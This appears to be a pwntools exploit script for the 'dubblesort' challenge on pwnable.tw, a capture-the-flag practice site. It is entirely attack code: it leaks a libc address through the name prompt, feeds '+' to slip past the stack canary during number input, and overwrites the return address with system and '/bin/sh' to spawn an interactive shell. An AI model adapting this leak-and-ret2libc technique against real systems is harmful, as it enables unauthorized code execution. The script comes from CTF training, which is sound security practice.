from pwn import *
import sys

if len(sys.argv) < 2:
	r = process("./dubblesort")
	base_offset = 0x1b2000
	system_offset = 0x3ada0
	binsh_offset = 0x15ba0b
else:
	host, port = "chall.pwnable.tw", 10101
	r = remote(host, port)
	base_offset = 0x01b0000 
	libc = ELF("./libc_32.so.6")
	system_offset = libc.symbols['system']
	binsh_offset = next(libc.search('/bin/sh'))

raw_input("debug")

r.sendlineafter("What your name :", 'a'*24)
r.recvuntil('aaaa\n')
res = "\x00" + r.recv(3)
leak = u32(res)
log.info("leak_add = %#x" %leak)

libc_base = leak - base_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset

r.sendlineafter("what to sort :", "35")
for i in range(32):
	if i == 24:
		r.sendlineafter("number : ", "+")
	elif i > 24:
		r.sendlineafter("number : ", str(int(libc_base)))
	else:
		r.sendlineafter("number : ", "1")

r.sendlineafter("number : ", str(int(system_add)))
r.sendlineafter("number : ", str(int(system_add)))
r.sendlineafter("number : ", str(int(binsh_add)))

r.interactive()
r.close()
